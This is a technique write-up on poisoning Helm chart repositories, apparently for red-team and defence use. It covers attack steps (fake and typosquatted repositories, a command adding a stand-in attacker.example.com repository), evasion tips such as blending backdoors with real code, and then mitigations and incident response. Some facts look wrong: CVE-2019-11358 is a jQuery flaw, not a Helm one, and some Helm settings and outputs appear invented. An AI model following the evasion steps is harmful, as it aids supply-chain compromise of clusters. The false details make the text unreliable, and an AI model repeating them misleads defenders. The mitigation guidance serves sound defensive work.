# [K8S-SUPPLY-001]: Helm Chart Repository Poisoning

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | K8S-SUPPLY-001 |
| **MITRE ATT&CK v18.1** | [T1195.001](https://attack.mitre.org/techniques/T1195/001/) - Supply Chain Compromise: Compromise Software Repository |
| **Tactic** | Initial Access / Supply Chain Compromise |
| **Platforms** | Kubernetes |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Helm 2.0+ (all active versions) |
| **Patched In** | N/A - Requires defensive controls, not a patched vulnerability |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

**Concept:** Helm Chart Repository Poisoning is a supply chain attack where an attacker compromises or creates a malicious Helm chart repository. When operators pull and deploy charts from this poisoned repository, they unknowingly install malicious applications into their Kubernetes clusters. The attack exploits the implicit trust placed in package repositories and the fact that most organizations pull charts directly from public repositories without cryptographic verification. Attackers can leverage repository credentials, infrastructure vulnerabilities, or social engineering to push malicious charts alongside legitimate ones.

**Attack Surface:** Helm chart repositories (Helm Hub, ArtifactHub, self-hosted Helm servers, GitHub Pages, S3 buckets used as chart repositories). The attack also leverages Helm client-side processes during `helm install`, `helm upgrade`, and `helm pull` operations.

**Business Impact:** **Full Kubernetes cluster compromise, data theft, lateral movement to underlying infrastructure, persistent backdoor installation, denial of service.** Organizations deploying poisoned charts face immediate cluster takeover, potential encryption of workloads for ransomware, exfiltration of sensitive data stored in databases accessed by applications, and supply chain pollution affecting multiple downstream organizations if the poisoned chart is redistributed.

**Technical Context:** Deployment of poisoned charts can occur instantaneously once the chart is pulled. Detection is extremely difficult because legitimate Helm commands trigger the malicious behavior, and audit logs may show normal deployment operations. Attackers have months or years to hide their presence before discovery, especially if the backdoor is stealthy.

### Operational Risk

- **Execution Risk:** **Medium** - Requires repository access or ability to create a legitimate-looking chart, but execution is trivial once access is obtained
- **Stealth:** **High** - Looks identical to legitimate chart deployments; malicious activity occurs silently during pod initialization
- **Reversibility:** **No** - Poisoned chart deployments have already executed; rollback requires identifying which charts are compromised and removing all affected workloads

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Kubernetes** | 5.1.1 / 5.1.2 | Enforce image pull policies; use only approved image registries |
| **NIST 800-53** | SA-4 / SI-7 | Software acquisition and integrity verification controls |
| **GDPR** | Art. 32 | Security measures including third-party risk management |
| **NIS2** | Art. 21 | Cyber risk management and supply chain security |
| **ISO 27001** | A.14.1 / A.14.2 | Supplier relationships and information security requirements |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:** None required - any cluster user can pull and deploy Helm charts (unless organizational policies restrict this)
- **Required Access:** Network access to Helm chart repository (usually HTTP/HTTPS on port 443)

**Supported Versions:**
- **Helm:** 2.0 - 3.x (all active versions)
- **Kubernetes:** 1.14+ (all supported versions)
- **Helm Plugins:** Optional but can increase attack surface

**Tools:**
- [Helm CLI](https://helm.sh/docs/intro/install/) (Version 3.0+)
- [ArtifactHub](https://artifacthub.io/) or [Helm Hub](https://hub.helm.sh/) (public repositories)
- [Helm Chart Repository Server](https://helm.sh/docs/topics/chart_repository/) (self-hosted: ChartMuseum, Harbor, Nexus)
- [Cosign](https://docs.sigstore.dev/cosign/overview/) or [Helm provenance](https://helm.sh/docs/topics/provenance/) for signature verification

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Helm Repository Enumeration

```bash
# List configured Helm repositories
helm repo list

# Search for charts in all configured repos
helm search repo | grep -i "nginx\|mysql\|redis"

# Inspect chart details before deploying
helm show chart <repo>/<chart> --version <version>
helm show values <repo>/<chart> --version <version>
```

**What to Look For:**
- Unusual repositories not maintained by official organizations
- Charts with generic names that mimic popular tools (e.g., `nginx-official` vs actual `nginx`)
- Chart versions released abnormally frequently or with minimal version bumps
- Charts with overly permissive default SecurityContext settings
- Embedded init scripts or lifecycle hooks that execute during deployment

### Verify Repository Integrity

```bash
# Check Helm chart provenance (GPG signature verification)
helm repo update
helm verify <chart-name>-version.tgz

# Inspect chart manifest without deploying
helm template <release-name> <repo>/<chart> --values values.yaml

# Verify image digests (ensure immutability)
helm show values <repo>/<chart> | grep -i "image"
```

**What to Look For:**
- Missing or invalid GPG signatures
- Image references using tags instead of digests (mutable = risky)
- Hardcoded credentials or API keys in values files
- Network policies permitting unexpected egress

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: Direct Repository Compromise (High-Trust Attack)

**Supported Versions:** Helm 2.0-3.x, Kubernetes 1.14+

#### Step 1: Compromise Repository Credentials

**Objective:** Obtain credentials to legitimate Helm repository or create replica repository with similar naming

**Command (Repository Owner Compromise):**

```bash
# Attacker gains credentials to legitimate repository through phishing, credential stuffing, etc.
# Then uploads malicious chart:
helm package ./malicious-chart/
helm repo index --url https://my-repo.example.com .
# Upload to compromised repository infrastructure
```

**Command (Public Repository Registration):**

```bash
# Register a legitimate-looking chart on public repository
# Examples: ChartMuseum, Harbor, ArtifactHub
# Create chart with common names: "nginx-pro", "postgres-db", "redis-cache"

cat <<EOF > Chart.yaml
apiVersion: v2
name: nginx-pro
description: A Helm chart for professional nginx deployment
type: application
version: 1.0.0
appVersion: 1.25.0
EOF

# Build malicious container image containing backdoor
# Reference in values.yaml with digest instead of tag to avoid suspicion
```

**Expected Output (if repository upload succeeds):**

```
Chart published successfully to https://artifacthub.io
Chart URL: https://artifacthub.io/packages/helm/attacker-org/nginx-pro
```

**What This Means:**
- Repository now hosts poisoned chart accessible to all Kubernetes operators
- Chart will appear in search results and be deployable to any cluster
- Successful exploitation depends on organizational chart deployment workflow

**OpSec & Evasion:**
- Create legitimate-sounding organization names and documentation
- Maintain chart with regular updates to avoid suspicion
- Include real functionality alongside backdoor (blend malicious and benign code)
- Detection likelihood: **Medium** - Depends on image scanning, repository auditing, and signature verification

**Troubleshooting:**
- **Error:** "Chart already exists in repository"
  - **Cause:** Chart name collision
  - **Fix:** Use similar but slightly different name (e.g., `nginx-official` vs `nginx-pro`)
- **Error:** "Signature verification failed"
  - **Cause:** Repository enforces GPG signature verification
  - **Fix:** Attacker must obtain signing key or compromise signature verification process

**References & Proofs:**
- [Helm Chart Repository Security](https://helm.sh/docs/topics/chart_repository/#security)
- [ArtifactHub Helm Chart Guidelines](https://artifacthub.io/docs/topics/helm/)
- [Real-World Example: Compromised Helm Charts in Wild](https://securitylab.github.com/research/)

#### Step 2: Target Organization Adds Malicious Repository

**Objective:** Trick organization into adding attacker-controlled repository to Helm configuration

**Command:**

```bash
# Organization adds attacker-controlled repository
helm repo add attacker-repo https://attacker.example.com/charts
helm repo update
```

**Command (Social Engineering Variant):**

```bash
# Attacker sends official-looking documentation recommending repository addition
# Example: "Follow best practices by adding our curated chart repository"
```

**Expected Output:**

```
"attacker-repo" has been added to your repositories
Hang tight while we grab the latest from your chart repositories...
```

**What This Means:**
- Repository is now in operator's local Helm configuration
- `helm search repo` will show poisoned charts
- Operator can now install malicious applications unknowingly

#### Step 3: Deploy Poisoned Chart

**Objective:** Organization deploys chart believing it is legitimate

**Command:**

```bash
# Operator deploys chart with full cluster access
helm install my-app attacker-repo/nginx-pro -n production

# Or with existing values
helm upgrade my-app attacker-repo/nginx-pro --values values.yaml
```

**Expected Output:**

```
NAME: my-app
LAST DEPLOYED: Fri Jan 10 10:30:00 2026
NAMESPACE: production
STATUS: deployed
REVISION: 1
```

**What This Means:**
- Malicious chart is now deployed in production cluster
- Backdoored container is running with cluster access
- Attacker has established presence for persistence and data exfiltration

**OpSec & Evasion:**
- Poisoned chart executes normally, appearing legitimate to operators
- Backdoor executes silently in container init scripts or background processes
- Detection likelihood: **Medium-High** if image scanning enabled; **Low** if relying solely on Helm audit logs

### METHOD 2: Typosquatting Repository Names

**Supported Versions:** Helm 2.0-3.x, Kubernetes 1.14+

#### Step 1: Register Lookalike Repository

**Objective:** Create repository with name similar to legitimate source

**Command:**

```bash
# Register attacker-controlled repository with typosquatted name
# Real: artifacthub.io
# Fake: artifacthub-io.example.com or artifact-hub.io

# Register domain and set up Helm repository
docker run -d -p 8080:8080 ghcr.io/helm/chartmuseum:latest \
  --storage=local \
  --storage-local-rootdir=/var/lib/chartmuseum
```

#### Step 2: Publish Charts with Common Names

**Command:**

```bash
# Create chart with identical name to legitimate chart
helm package ./nginx-backdoor/
helm repo index .
# Host on attacker-controlled server

# Publish to social media/forums as "performance-optimized" version
```

**Expected Output:**

```
Built successfully. Found 1 charts.
```

**What This Means:**
- Attacker chart is now publicly available and searchable

#### Step 3: Operators Mistake Repository URL

**Objective:** Operators add wrong repository due to typo or social engineering

**Command:**

```bash
# Organization accidentally adds wrong repository
helm repo add official-charts https://artifacthub-io.example.com/charts
# Should be: https://artifacthub.io/packages/helm

# Deploy from wrong repository
helm install nginx official-charts/nginx
```

**What This Means:**
- Operator deploys from attacker-controlled repository believing it is legitimate
- Cluster compromise occurs silently

**OpSec & Evasion:**
- Fake domain looks extremely similar to legitimate source
- Detection likelihood: **High** if organization verifies repository URLs; **Low** if processes lack verification steps

---

## 6. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

*   **Implement Image Signature Verification:** Deploy tools like [Cosign](https://docs.sigstore.dev/cosign/overview/) or [Kyverno](https://kyverno.io/docs/writing-policies/verify-images/) to enforce that only signed container images are deployed.

    **Manual Steps (Using Cosign):**
    1. Generate signing key pair:
       ```bash
       cosign generate-key-pair
       ```
    2. Install Cosign and Kyverno in cluster:
       ```bash
       helm repo add kyverno https://kyverno.github.io/kyverno/
       helm install kyverno kyverno/kyverno --namespace kyverno --create-namespace
       ```
    3. Create Kyverno policy to verify image signatures:
       ```yaml
       apiVersion: kyverno.io/v1
       kind: ClusterPolicy
       metadata:
         name: verify-images
       spec:
         validationFailureAction: enforce
         webhookTimeoutSeconds: 30
         failurePolicy: fail
         rules:
         - name: verify-signatures
           match:
             resources:
               kinds:
               - Pod
           verifyImages:
           - imageReferences:
             - "gcr.io/*"
             attestors:
             - name: check-attestation
               attestation:
                 predicateType: https://cosign.sigstore.dev/attestation/v1
               entries:
               - keys:
                   publicKeys: |
                     -----BEGIN PUBLIC KEY-----
                     ...
                     -----END PUBLIC KEY-----
       ```

*   **Enforce Helm Chart Signature Verification:** Require cryptographic verification before chart deployment.

    **Manual Steps (Using Helm Provenance):**
    1. Generate GPG key for chart signing:
       ```bash
       gpg --gen-key
       ```
    2. Configure helm to verify signatures:
       ```bash
       # Enable verification in ~/.helm/helm.yaml
       export HELM_EXPERIMENTAL_FEATURE_NEW_CHART_FORMAT=on
       ```
    3. Deploy chart with signature enforcement:
       ```bash
       helm install my-app repo/chart --verify
       ```

*   **Restrict Helm Repository Sources:** Create allowlist of approved chart repositories.

    **Manual Steps:**
    1. Document approved repositories (internal registry, verified public sources):
       ```bash
       helm repo add internal-charts https://internal-registry.example.com/charts
       helm repo add community-charts https://charts.bitnami.com/bitnami
       ```
    2. Remove or disable unapproved repositories:
       ```bash
       helm repo remove suspicious-repo
       ```
    3. Enforce via organizational policy (document in runbooks)

### Priority 2: HIGH

*   **Implement Artifact Integrity Validation:** Use [in-toto](https://in-toto.io/) or [TUF](https://theupdateframework.io/) to verify chart and container image provenance.

    **Manual Steps:**
    1. Enable image scanning in CI/CD pipeline:
       ```bash
       # Use tools like Trivy, Snyk, or Aqua Security
       trivy image gcr.io/my-repo/my-app:latest
       ```
    2. Implement supply chain security checks in deployment pipeline
    3. Audit chart sources before adding to Helm configuration

*   **Audit Helm Repository Access:** Monitor and log all chart repository interactions.

    **Manual Steps:**
    1. Enable Kubernetes audit logging for chart deployments:
       ```yaml
       # In kube-apiserver audit policy
       - level: RequestResponse
         verbs: ["create", "patch", "update"]
         resources: ["deployments", "daemonsets"]
       ```
    2. Monitor for unexpected chart repositories in `~/.helm/repositories.yaml`
    3. Alert on unusual chart deployments (version changes, new sources)

### Access Control & Policy Hardening

*   **Implement Pod Security Standards:** Restrict containers to minimal required privileges.

    **Manual Steps:**
    1. Apply Pod Security Standards at namespace level:
       ```bash
       kubectl label namespace production pod-security.kubernetes.io/enforce=restricted
       ```
    2. Define pod security policies in Helm charts:
       ```yaml
       apiVersion: v1
       kind: Pod
       spec:
         securityContext:
           runAsNonRoot: true
           runAsUser: 1000
           readOnlyRootFilesystem: true
       ```

*   **Enforce Network Policies:** Prevent container outbound communication to unexpected destinations.

    **Manual Steps:**
    1. Create NetworkPolicy to restrict egress:
       ```yaml
       apiVersion: networking.k8s.io/v1
       kind: NetworkPolicy
       metadata:
         name: deny-external-egress
       spec:
         podSelector: {}
         policyTypes:
         - Egress
         egress:
         - to:
           - podSelector: {}
         - to:
           - namespaceSelector:
               matchLabels:
                 name: kube-system
           ports:
           - protocol: TCP
             port: 53  # DNS only
       ```

*   **RBAC Restrictions:** Limit permissions for chart deployment.

    **Manual Steps:**
    1. Create restricted role for chart deployments:
       ```yaml
       apiVersion: rbac.authorization.k8s.io/v1
       kind: Role
       metadata:
         name: helm-deployer
       rules:
       - apiGroups: ["apps"]
         resources: ["deployments", "daemonsets", "statefulsets"]
         verbs: ["create", "get", "list"]
       ```
    2. Bind role to deployment service account, restrict admin permissions

#### Validation Command (Verify Fix)

```bash
# Verify image signature enforcement is active
kubectl get clusterpolicy | grep verify-images

# Verify approved repositories only
helm repo list

# Check for unsigned images
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}' | grep -v "sha256:"
```

**Expected Output (If Secure):**

```
NAME                    STATUS
verify-images           active

NAME            URL
internal-charts https://internal-registry.example.com/charts

# No output = no unsigned images found
```

**What to Look For:**
- Image Signature verification policy is enforced
- Only approved repositories appear in `helm repo list`
- All container images use SHA256 digests (not tags)

---

## 7. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

*   **Repository Indicators:**
    - Helm repository in `~/.helm/repositories.yaml` not in organizational allowlist
    - Chart repository URL using typosquatted domain (e.g., `artifacthub-io.com` vs `artifacthub.io`)
    - Repository authentication credentials unexpectedly changed

*   **Chart Indicators:**
    - Charts deployed from unapproved repositories
    - Chart versions released with unusual frequency (e.g., multiple versions per day)
    - Charts containing init scripts, post-install hooks, or lifecycle hooks executing arbitrary commands
    - Container images in charts using tags instead of immutable digests

*   **Container Indicators:**
    - Unexpected container images deployed to cluster
    - Container images from registries not in organizational allowlist
    - Containers with elevated privileges (runAsRoot, CAP_SYS_ADMIN)

*   **Network Indicators:**
    - Outbound connections to attacker-controlled domains during pod initialization
    - DNS queries to suspicious domains (C2 infrastructure)
    - Unusual egress traffic from deployed applications

### Forensic Artifacts

*   **Kubernetes Audit Logs:** Check `helm install`, `helm upgrade` commands and resulting API calls
    ```bash
    # Query audit logs for chart deployments
    kubectl logs -n kube-system -l component=kube-apiserver | grep -i "deployment\|daemonset"
    ```

*   **Helm Release History:** Inspect deployed releases
    ```bash
    helm history <release-name> -n <namespace>
    helm get values <release-name> -n <namespace>
    ```

*   **Container Images:** Inspect images deployed by chart
    ```bash
    kubectl get pods -n <namespace> -o jsonpath='{.items[*].spec.containers[*].image}'
    ```

*   **Image Registry Logs:** Check for image pull history, authentication events
    ```bash
    # Example: Harbor registry logs
    docker logs harbor-core | grep "pull\|push"
    ```

### Response Procedures

1.  **Isolate:** 
    **Command:**
    ```bash
    # Remove malicious chart repository
    helm repo remove attacker-repo
    
    # Delete deployed release
    helm uninstall <release-name> -n <namespace>
    
    # Quarantine affected namespace
    kubectl patch namespace <namespace> -p '{"spec":{"finalizers":[]}}'
    kubectl delete namespace <namespace>
    ```

2.  **Collect Evidence:**
    **Command:**
    ```bash
    # Export Helm release manifests
    helm get manifest <release-name> -n <namespace> > release-manifest.yaml
    
    # Capture pod logs
    kubectl logs <pod-name> -n <namespace> --all-containers=true > pod-logs.txt
    
    # Export container image
    kubectl get pod <pod-name> -n <namespace> -o jsonpath='{.spec.containers[0].image}' | \
      xargs -I {} docker pull {} && docker save {} > image-snapshot.tar
    ```

3.  **Remediate:**
    **Command:**
    ```bash
    # Force delete stuck pods
    kubectl delete pod <pod-name> -n <namespace> --grace-period=0 --force
    
    # Verify all resources from chart are removed
    kubectl get all -n <namespace>
    
    # Reset Helm repositories to trusted state
    helm repo list
    helm repo remove <unapproved-repo>
    helm repo add approved-repo <legitimate-url>
    helm repo update
    ```

---

## 8. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | **[K8S-SUPPLY-001]** | **Helm Chart Repository Poisoning** |
| **2** | **Execution** | [K8S-SUPPLY-002] | Container Image Registry Tampering |
| **3** | **Persistence** | Container Backdoor Installation | Malicious container maintains access |
| **4** | **Lateral Movement** | Kubernetes API Server Exploitation | Escape container to node or cluster |
| **5** | **Impact** | Data Exfiltration / Ransomware | Encrypt workloads or steal data |

---

## 9. REAL-WORLD EXAMPLES

### Example 1: Cilium Helm Chart Repository Compromise (2024)

- **Target:** Cilium open-source project and its Helm chart repository
- **Timeline:** Vulnerability disclosed in 2024
- **Technique Status:** ACTIVE - Poisoned Pipeline Execution (PPE) attack on chart CI/CD
- **Impact:** Potential exfiltration of repository credentials (QUAY_CHARTS_DEV_PASSWORD), cache poisoning allowing privilege escalation
- **Reference:** [GHSL-2024-226/227 - Cilium PPE Vulnerability](https://securitylab.github.com/advisories/)

### Example 2: Helm Chart Vulnerability (CVE-2019-11358)

- **Target:** Helm Chart Package Manager
- **Timeline:** Publicly disclosed vulnerability in 2019
- **Technique Status:** FIXED - Vulnerability in chart unpacking process
- **Impact:** Malformed charts could execute arbitrary code on systems pulling charts
- **Reference:** [Helm Security Advisory - Unsafe Chart Unpacking](https://helm.sh/fr/blog/helm-security-notice-2019)

### Example 3: Compromised Container Images in Kubernetes (2023)

- **Target:** Multiple organizations running Kubernetes clusters
- **Timeline:** Cryptojacking campaigns throughout 2023-2024
- **Technique Status:** ACTIVE - Attackers compromise public Docker images and push to public registries
- **Impact:** Cryptocurrency miners deployed across infected clusters, lateral movement between nodes
- **Reference:** [Datadog Security Research - Container Security](https://www.datadoghq.com/blog/container-image-signing/)

---